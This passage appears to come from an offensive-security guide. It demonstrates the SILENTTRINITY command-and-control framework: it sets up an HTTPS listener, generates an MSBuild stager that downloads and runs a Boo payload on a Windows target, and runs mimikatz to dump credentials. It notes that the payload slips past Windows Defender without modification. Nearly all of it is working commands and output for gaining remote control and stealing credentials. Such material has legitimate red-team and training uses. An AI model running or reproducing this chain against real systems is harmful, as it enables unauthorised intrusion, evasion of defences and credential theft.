```
[1] ST (listeners)(https) >> list
Running:
customlistener >> https://192.168.1.29:443
```

Once you are connected, the next logical step is to generate a payload to execute on the target. We opt for a .NET task containing inline C# code that we can compile and run on the fly using a .NET utility called MSBuild:

```
[1] ST (listeners)(https) >> stagers

[1] ST (stagers) >> use msbuild
[1] ST (stagers) >> generate customListener
[+] Generated stager to ./stager.xml
```

If we take a closer look at the stager.xml file, we can see it embeds a base64-encoded version of an executable called naga.exe (SILENTTRINITY/core/teamserver/data/naga.exe), which connects back to the listener we set up and then downloads a ZIP file containing Boo-Lang DLLs and a script to bootstrap the environment.

Once we compile and run this payload on the fly using MSBuild, we will have a full Boo environment running on the target’s machine, ready to execute whatever shady payload we send its way:

```
# Start agent

PS C:\> C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe stager.xml

[*] [TS-vrFt3] Sending stage (569057 bytes) -> 192.168.1.30...
[*] [TS-vrFt3] New session 36e7f9e3-13e4-4fa1-9266-89d95612eebc connected!
(192.168.1.30)
[1] ST (listeners)(https) >> sessions
[1] ST (sessions) >> list
Name                 >> User                 >> Address        >> Last Checkin
36e7f9e3-13... >> *wk_adm@PIANO>> 192.168.1.3 >> h 00 m 00 s 04
```

Notice how, unlike with the other two frameworks, we did not bother customizing the payload to evade Windows Defender. It just works . . . for now!

We can deliver any of the current 69 post-exploitation modules, from loading an arbitrary assembly (.NET executable) in memory to regular Active Directory reconnaissance and credential dumping:

```
[1] ST (sessions) >> modules
[1] ST (modules) >> use boo/mimikatz
[1] ST (modules)(boo/mimikatz) >> run all

[*] [TS-7fhpY] 36e7f9e3-13e4-4fa1-9266-89d95612eebc returned job result
(id: zpqY2hqD1l)
[+] Running in high integrity process
--snip--
msv :
  [00000003] Primary
  * Username : wkadmin
```